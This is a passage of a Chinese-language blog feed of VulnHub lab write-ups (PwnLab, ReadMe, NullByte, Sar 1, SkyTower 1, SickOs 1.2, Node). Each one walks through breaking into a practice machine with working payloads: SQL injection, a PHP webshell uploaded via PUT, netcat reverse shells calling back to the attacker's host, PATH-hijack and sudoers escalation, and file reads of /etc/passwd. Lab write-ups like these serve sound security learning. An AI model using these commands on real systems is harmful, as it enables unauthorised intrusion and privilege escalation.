<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v --cookie &quot;lang&#x3D;..&#x2F;upload&#x2F;b1a99ebaad4dd28f57517de36e770484.gif&quot; http:&#x2F;&#x2F;192.168.1.206&#x2F;index.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/PwnLab/11.png" alt="11"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>首先检查/etc/passwd发现了数据里的用户名，尝试切换用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kane&#x2F;iSv5Ym2GRo</span><br></pre></td></tr></table></figure>

<p>这里kane是可以切换的</p>
<p><img src="/images/PwnLab/12.png" alt="12"></p>
<p>winpeas发现了有趣SUID文件，直接执行试试</p>
<p><img src="/images/PwnLab/13.png" alt="13"></p>
<p>看起来它通过环境变量调用了cat命令查看了一个什么文件，这文件还不存在</p>
<p>strings简单分析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings msgmike</span><br></pre></td></tr></table></figure>

<p><img src="/images/PwnLab/14.png" alt="14"></p>
<p>果然有这条命令，而且这里的SUID是mIke</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -l msgmike                                                                                                                                                                       </span><br><span class="line">-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 msgmike  </span><br></pre></td></tr></table></figure>

<p>这和某考试的著名机器很像，我们可以通过控制环境变量，替换同名文件，来控制它的行为</p>
<p>我们现在kali上创建一个文件evil.c</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main ( int argc, char *argv[] )</span><br><span class="line">&#123;</span><br><span class="line">        setreuid(0,0);</span><br><span class="line">        execve(&quot;&#x2F;bin&#x2F;sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着到目标机器上传输这个文件，并编译，保存名称为cat</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc evil.c -o cat -m32</span><br></pre></td></tr></table></figure>

<p>测试执行以下，看能不能进入/bin/sh</p>
<p><img src="/images/PwnLab/16.png" alt="16"></p>
<p>修改文件权限777，之后修改环境变量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 777 cat</span><br><span class="line">export PATH&#x3D;&#x2F;tmp</span><br></pre></td></tr></table></figure>

<p>陷阱已经搭建好了，只需要猎物主动运行即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;home&#x2F;kane&#x2F;msgmike</span><br></pre></td></tr></table></figure>

<p><img src="/images/PwnLab/15.png" alt="15"></p>
<p>这样，程序以SUID运行msgmike，并通过环境变量，运行了假的cat(这里为调用/bin/sh)，从而让执行者(我)进入了SUID的/bin/sh</p>
<p>进入成功别忘了还原</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;bin:&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;games:&#x2F;usr&#x2F;games</span><br></pre></td></tr></table></figure>

<p>之后再次linpeas枚举</p>
<p>这次在家发现了SUID文件，而且拥有者是root</p>
<p><img src="/images/PwnLab/17.png" alt="17"></p>
<p>这里就简单尝试几个常见的命令注入，很快就可以有所发现</p>
<p><img src="/images/PwnLab/18.png" alt="18"></p>
<p>最后的命令注入payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1;&#x2F;bin&#x2F;bash$IFS-p</span><br></pre></td></tr></table></figure>

<p><img src="/images/PwnLab/19.png" alt="19"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场ReadMe</title>
    <url>/2020/09/27/%E9%9D%B6%E5%9C%BAReadMe/</url>
    <content><![CDATA[<h1 id="ReadMe"><a href="#ReadMe" class="headerlink" title="ReadMe"></a>ReadMe</h1><p>发现80端口并进行目录枚举</p>
<p>发现</p>
<ul>
<li><code>/info.php</code>：phpinfo页面</li>
<li><code>/reminder.php</code>：发现了文件的路径提示</li>
<li><code>/adminer.php</code>：CMS Adminer 4.4.0</li>
</ul>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>直接搜索Adminer的公开漏洞，只发现了SSRF，这里没什么用</p>
<p>首先确认Adminer的功能，应该是一个数据库连接的图形化web页面</p>
<p><img src="/images/Readme/7.png" alt="7"></p>
<p>通过phpinfo页面，发现了一些线索</p>
<p><code>mysqli.allow_local_infile</code>处于开启，说明也许通过<code>load data infile</code>来进行文件读取</p>
<p><img src="/images/Readme/6.png" alt="6"></p>
<p><code>openbasedir</code>无限制，说明可以读取任意文件</p>
<p><img src="/images/Readme/3.png" alt="3"></p>
<p>现在来创建利用所需要的条件</p>
<p>kali启动mysql</p>
<p>创建用户，赋予权限，允许远程登录(%表示任意ip登录)，刷新权限，创库建表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE adminer;</span><br><span class="line">CREATE USER &#39;demo&#39;@&#39;%&#39; IDENTIFIED BY &#39;demo_admirer&#39;;</span><br><span class="line">GRANT ALL PRIVILEGES ON * . * TO &#39;demo&#39;@&#39;%&#39;;</span><br><span class="line">FLUSH PRIVILEGES;</span><br><span class="line">use adminer;</span><br><span class="line">create table test(data VARCHAR(255));</span><br></pre></td></tr></table></figure>


<p>本地数据库开启<code>local_infile</code>，ON说明开启</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SET GLOBAL local_infile &#x3D; true;</span><br><span class="line">SHOW GLOBAL VARIABLES LIKE &#39;local_infile&#39;;</span><br></pre></td></tr></table></figure>

<p>编辑<code>/etc/mysql/mariadb.conf.d/50-server.cnf</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bind-address      &#x3D;0.0.0.0</span><br></pre></td></tr></table></figure>

<p>验证登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -h localhost -u demo -pdemo_admirer</span><br></pre></td></tr></table></figure>

<p>这样前期准备工作就已经完成了</p>
<p>到web页面输入连接的信息，跳转到下面的页面</p>
<p><img src="/images/Readme/1.png" alt="1"></p>
<p>注意到左边显示了存在的表(test)，并允许我们执行sql语句，我们跳转到执行语句的页面，执行如下sql语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load data local infile &#39;&#x2F;etc&#x2F;passwd&#39;</span><br><span class="line">into table test</span><br><span class="line">fields terminated by &quot;&#x2F;n&quot;</span><br></pre></td></tr></table></figure>

<p>回去查看test表，发现数据已经被写入</p>
<p><img src="/images/Readme/2.png" alt="2"></p>
<p>为了看起来方便，我们可以删掉表中的记录，重新来插别的文件内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">delete from test where 1&#x3D;1;</span><br></pre></td></tr></table></figure>

<p>现在去读之前页面提示的重要文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load data local infile &#39;&#x2F;etc&#x2F;julian.txt&#39; into table test fields terminated by &quot;&#x2F;n&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Readme/4.png" alt="4"></p>
<p>发现了登录凭据</p>
<p>直接ssh过去</p>
<p><img src="/images/Readme/5.png" alt="5"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场NullByte</title>
    <url>/2020/09/22/%E9%9D%B6%E5%9C%BANullByte/</url>
    <content><![CDATA[<h1 id="NullByte"><a href="#NullByte" class="headerlink" title="NullByte"></a>NullByte</h1><p>kali:192.168.1.201<br>目标:192.168.1.228</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.228 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.228 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/NullByte/1.png" alt="1"></p>
<p><img src="/images/NullByte/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/NullByte/2.png" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>搜索尝试phpmyadmin公开漏洞，但是没找到正确的道路，尝试爆破</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l root -P rockyou.txt 192.168.1.228 -f -s 80 http-form-post &quot;&#x2F;phpmyadmin&#x2F;index.php:pma_username&#x3D;^USER^&amp;pma_password&#x3D;^PASS^&amp;server&#x3D;1&amp;target&#x3D;index.php&amp;lang&#x3D;en&amp;collation_connection&#x3D;utf8_general_ci&amp;token&#x3D;9dd398ea38b1c91dc2e57694eb350d3b:Cannot&quot; -t 64 -V</span><br></pre></td></tr></table></figure>

<p><img src="/images/NullByte/3.png" alt="3"></p>
<p>登录phpmyadmin，尝试写入shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php phpinfo(); ?&gt;&quot; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;evil.php&#39; </span><br></pre></td></tr></table></figure>

<p><img src="/images/NullByte/4.png" alt="4"></p>
<p>权限不足，那尝试写入dirbuster爆出的别的目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php phpinfo(); ?&gt;&quot; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;evil.php&#39; </span><br></pre></td></tr></table></figure>

<p><img src="/images/NullByte/5.png" alt="5"></p>
<p>之后访问</p>
<p><img src="/images/NullByte/6.png" alt="6"></p>
<p>成功执行，那写个一句话过去，反弹shell即可</p>
<p><img src="/images/NullByte/7.png" alt="7"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/NullByte/8.png" alt="8"></p>
<p>首先发现了exim4，我尝试许多针对于它的EDB的本地提权，不过都没有成功<br>查看另一个SUID文件</p>
<p><img src="/images/NullByte/9.png" alt="9"></p>
<p>简单尝试运行，感觉像是执行了ps命令，传送到kali分析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x procwatch</span><br><span class="line">ltrace .&#x2F;procwatch</span><br></pre></td></tr></table></figure>

<p><img src="/images/NullByte/10.png" alt="10"></p>
<p>看来找到了正确的道路</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;&#x2F;bin&#x2F;sh&#39; &gt; &#x2F;tmp&#x2F;ps</span><br><span class="line">chmod +x &#x2F;tmp&#x2F;ps</span><br><span class="line">export PATH&#x3D;&#x2F;tmp</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;backup&#x2F;procwatch</span><br></pre></td></tr></table></figure>

<p><img src="/images/NullByte/11.png" alt="11"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Sar 1</title>
    <url>/2020/09/20/%E9%9D%B6%E5%9C%BASar-1/</url>
    <content><![CDATA[<h1 id="Sar-1"><a href="#Sar-1" class="headerlink" title="Sar 1"></a>Sar 1</h1><p>kali:192.168.1.201<br>目标:192.168.1.222</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.222 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.222 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/Sar-1/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>访问目标robots.txt发现了路径</p>
<p><img src="/images/Sar-1/2.png" alt="2"></p>
<p>目标存在phpinfo.php</p>
<p><img src="/images/Sar-1/3.png" alt="3"></p>
<p>访问/sar2HTML/发现了sar2html 3.2.1</p>
<p><img src="/images/Sar-1/4.png" alt="4"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>寻找公开漏洞可以发现RCE漏洞</p>
<p><img src="/images/Sar-1/5.png" alt="5"></p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>但是先别急，因为首页有一处非常显眼的文件上传点，我们不经任何处理，直接上传.php的shell，提示文件上传成功<br>现在需要找到这个文件的位置，这种CMS，建议直接去看官方文档或者找github看看源码</p>
<p>在github上，没有从源码的文件夹中直接找到upload字样的位置，但是在下方发现了一些提示性的文件夹</p>
<p><img src="/images/Sar-1/6.png" alt="6"></p>
<p>访问过去</p>
<p><img src="/images/Sar-1/7.png" alt="7"></p>
<p>发现了shell</p>
<p><img src="/images/Sar-1/8.png" alt="8"></p>
<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>尝试RCE，根据文档进行操作</p>
<p><img src="/images/Sar-1/9.png" alt="9"></p>
<p>这个RCE的回显处不在页面内，可以在DOM里看到，可以确认RCE成功</p>
<p><img src="/images/Sar-1/10.png" alt="10"></p>
<p>两种方法都能获取shell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>发现<code>/var/spool/cron/crontabs</code>可以写，但是这貌似不能给我们提权，没有发现<code>/var/spool/cron/root</code>这样的文件</p>
<p>计划任务枚举发现了信息</p>
<p><img src="/images/Sar-1/11.png" alt="11"></p>
<p>过去查看</p>
<p><img src="/images/Sar-1/12.png" alt="12"></p>
<p>提权看上去没有难度，只是套娃了而已</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;rm -rf &#x2F;tmp&#x2F;f;mknod &#x2F;tmp&#x2F;f p;&#x2F;bin&#x2F;sh 0&lt;&#x2F;tmp&#x2F;f | nc 192.168.1.201 53 1&gt;&#x2F;tmp&#x2F;f&#39; &gt;&gt;write.sh</span><br></pre></td></tr></table></figure>

<p><img src="/images/Sar-1/13.png" alt="13"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场SkyTower 1</title>
    <url>/2020/09/14/%E9%9D%B6%E5%9C%BASkyTower-1/</url>
    <content><![CDATA[<h1 id="SkyTower-1"><a href="#SkyTower-1" class="headerlink" title="SkyTower 1"></a>SkyTower 1</h1><p>kali:192.168.1.201</p>
<p>目标:192.168.1.239</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.239 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.239 -oN nmap</span><br></pre></td></tr></table></figure>

<p><img src="/images/SkyTower-1/1.png" alt="1"></p>
<p>发现了http服务和http代理服务</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>针对80口开始枚举</p>
<p>dirbuster并没有扫出太多的信息，它的主页是一个登录页面</p>
<p><img src="/images/SkyTower-1/2.png" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>在登陆出输入sql注入符号，尝试触发错误</p>
<p><img src="/images/SkyTower-1/3.png" alt="3"></p>
<p>得到了错误语句，看来是容易收到SQL注入攻击的</p>
<p>尝试payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>

<p>得到了错误回显</p>
<p><img src="/images/SkyTower-1/4.png" alt="4"></p>
<p>这是一个重要的信息，发现or疑似被过滤</p>
<p>尝试其他绕过符号，如and、|、&amp;</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; || 1&#x3D;1#</span><br></pre></td></tr></table></figure>

<p>这次payload生效</p>
<p>得到了另一个信息</p>
<p><img src="/images/SkyTower-1/5.png" alt="5"></p>
<p>看起来可以登录到某个位置，想到之前并没有扫到SSH开放，猜测或许需要使用对方的代理</p>
<p>proxychains添加对方的http代理</p>
<p><img src="/images/SkyTower-1/6.png" alt="6"></p>
<p>nmap扫描</p>
<p><img src="/images/SkyTower-1/7.png" alt="7"></p>
<p>发现22开启，尝试登录</p>
<p><img src="/images/SkyTower-1/8.png" alt="8"></p>
<p>失败，但是得到了一个提示<br>既然如此我们可以尝试一些对于Rshell的绕过技巧或者直接尝试ssh执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains ssh john@127.0.0.1 -t &quot;&#x2F;bin&#x2F;sh&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains ssh john@127.0.0.1 whoami</span><br><span class="line">john</span><br><span class="line"></span><br><span class="line">proxychains ssh john@127.0.0.1 &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>这样我们就有shell了</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>现在就有问题，虽然获得了shell，但不是TTY，机器上没有python没法生成伪tty</p>
<p>这里我们希望可以修改<code>.bashrc</code>，来修改删除掉限制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">case $- in</span><br><span class="line">    *i*) ;;</span><br><span class="line">      *) return;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<p>但是这里有R权限，我们不能编辑，但我们可以直接删掉它</p>
<p>这样退出再登录，不需要任何参数，就可以获得全交互的shell了</p>
<p><img src="/images/SkyTower-1/9.png" alt="9"></p>
<p>既然刚刚是通过sql注入进来的，那么可以去看mysql的配置</p>
<p><img src="/images/SkyTower-1/10.png" alt="10"></p>
<p>其实如果没有获取交互shell，也可以通过mysql -e来执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -u root -p xxxxxx -e &quot;show databases;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/SkyTower-1/11.png" alt="11"></p>
<p>尝试另外两个账户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sara&#x2F;ihatethisjob</span><br><span class="line">william&#x2F;senseable</span><br></pre></td></tr></table></figure>

<p>这两个账号同样需要绕过.bashrc的限制</p>
<p>在sara用户下，我们发现了sudo权限</p>
<p><img src="/images/SkyTower-1/12.png" alt="12"></p>
<p>虽然只能在accounts目录下使用，但这是一个很傻的决定</p>
<p><img src="/images/SkyTower-1/13.png" alt="13"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo ls &#x2F;accounts&#x2F;..&#x2F;root</span><br><span class="line">sudo cat &#x2F;accounts&#x2F;..&#x2F;root&#x2F;flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/SkyTower-1/14.png" alt="14"></p>
<p>直接找到一些有意思的东西，获取root</p>
<p><img src="/images/SkyTower-1/15.png" alt="15"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场SickOs 1.2</title>
    <url>/2020/09/13/%E9%9D%B6%E5%9C%BASickOs-1-2/</url>
    <content><![CDATA[<h1 id="SickOs-1-2"><a href="#SickOs-1-2" class="headerlink" title="SickOs 1.2"></a>SickOs 1.2</h1><p>kali:192.168.1.201</p>
<p>目标:192.168.1.218</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.218 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.218 -oN nmap</span><br></pre></td></tr></table></figure>

<p><img src="/images/SickOs-1.2/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>手动访问80端口，页面没啥信息<br>目录扫描</p>
<p><img src="/images/SickOs-1.2/2.png" alt="2"></p>
<p>发现目录/test/</p>
<p>在这之后就没有其他发现了</p>
<p>我们可以发现该页面是要一个目录，联想到有关目录的操作，枚举对方支持的HTTP方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v -X OPTIONS http:&#x2F;&#x2F;192.168.1.218&#x2F;test&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="/images/SickOs-1.2/3.png" alt="3"></p>
<p>发现可以使用put</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>也许我们能够使用put方法直接获取shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v -X PUT -d &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; http:&#x2F;&#x2F;192.168.1.218&#x2F;test&#x2F;shell.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/SickOs-1.2/4.png" alt="4"></p>
<p>这样我们可以直接反弹shell</p>
<p><img src="/images/SickOs-1.2/5.png" alt="5"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:&#x2F;tmp$ uname -i    </span><br><span class="line">i386</span><br></pre></td></tr></table></figure>

<p>目标为32位</p>
<p>linpeas扫描</p>
<p><img src="/images/SickOs-1.2/6.png" alt="6"></p>
<p>pspy32扫描</p>
<p><img src="/images/SickOs-1.2/7.png" alt="7"></p>
<p>发现了chkrootkit，利用它来提权 参考33899.txt</p>
<p><img src="/images/SickOs-1.2/9.png" alt="9"></p>
<p>等待执行</p>
<p><img src="/images/SickOs-1.2/8.png" alt="8"></p>
<p>或者sudoers提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;chmod 777 &#x2F;etc&#x2F;sudoers &amp;&amp; echo &quot;www-data ALL&#x3D;NOPASSWD: ALL&quot; &gt;&gt; &#x2F;etc&#x2F;sudoers &amp;&amp; chmod 440 &#x2F;etc&#x2F;sudoers&#39; &gt; &#x2F;tmp&#x2F;update</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Node</title>
    <url>/2020/09/26/%E9%9D%B6%E5%9C%BANode/</url>
    <content><![CDATA[<h1 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h1><p>kali:192.168.1.201<br>目标:192.168.1.234</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.234 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.234 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulhubNode/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>手动检查页面，目录枚举没有什么发现<br>考虑主机名为node，手动检查网页源代码的js文件，发现了该文件提示了目录</p>
<p><img src="/images/vulhubNode/2.png" alt="2"></p>
<p>去目录检查，发现json数据</p>
<p><img src="/images/vulhubNode/3.png" alt="3"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>破解密码</p>
<p><img src="/images/vulhubNode/4.png" alt="4"></p>
<p>尝试登录</p>
<p><img src="/images/vulhubNode/5.png" alt="5"></p>
<p>登录成功，但是提示只有管理员才能拥有控制台， 考虑枚举之前发现密码哈希的上级目录，这个思路在HTB里遇到过</p>
<p><img src="/images/vulhubNode/6.png" alt="6"></p>
<p>果然多了一个管理员账户，继续密码破解</p>
<p><img src="/images/vulhubNode/7.png" alt="7"></p>
<p>登录成功后会下载一个不知道什么文件</p>
<p><img src="/images/vulhubNode/8.png" alt="8"></p>
<p>查看后发现是base64，解码保存成一个文件，发现是一个zip，而且存在密码，尝试爆破</p>
<p><img src="/images/vulhubNode/9.png" alt="9"></p>
<p>破解成功，进行解压，是网站的web目录</p>
<p>由于该网站使用node.js，根据经验很快去搜寻配置文件<code>app.js</code>，从中发现了凭据</p>
<p><img src="/images/vulhubNode/10.png" alt="10"></p>
<p>尝试ssh</p>
<p><img src="/images/vulhubNode/11.png" alt="11"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="mongodb"><a href="#mongodb" class="headerlink" title="mongodb"></a>mongodb</h3><p>检查发现，tom正在执行某个node.js程序</p>
<p><img src="/images/vulhubNode/12.png" alt="12"></p>
<p>查看代码</p>
<p><img src="/images/vulhubNode/13.png" alt="13"></p>
<p>这个程序不难理解，它使用mark的凭据登录到数据库，从tasks中寻找cmd的值，并且会执行系统命令(exec)然后从数据库中删除，所以写入payload到里面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mongo -u mark -p 5AYRft73VtFpc84k scheduler</span><br><span class="line">show collections</span><br><span class="line">db.tasks.insert(&#123;&quot;cmd&quot;:&quot;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.1.201 5555 &gt;&#x2F;tmp&#x2F;f&quot;&#125;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/vulhubNode/13.png" alt="13"></p>
<p>之后等待执行，就能获取shell</p>
<p><img src="/images/vulhubNode/14.png" alt="14"></p>
<h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4.4.0-93-generic</span><br><span class="line">Ubuntu 16.04.3</span><br></pre></td></tr></table></figure>

<p>寻找漏洞</p>
<p><img src="/images/vulhubNode/15.png" alt="15"></p>
<p>44298.c提权</p>
<p><img src="/images/vulhubNode/16.png" alt="16"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Stapler1</title>
    <url>/2020/09/13/%E9%9D%B6%E5%9C%BAStapler1/</url>
    <content><![CDATA[<h1 id="Stapler1"><a href="#Stapler1" class="headerlink" title="Stapler1"></a>Stapler1</h1><p>kali:192.168.1.201</p>
<p>目标:192.168.1.207</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.207 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.207 -oN nmap</span><br></pre></td></tr></table></figure>

<p>nmap发现</p>
<p>21(ftp),22(SSH),53(DNS),80(http),139(smb),666,3306(mysql),12380(http)</p>
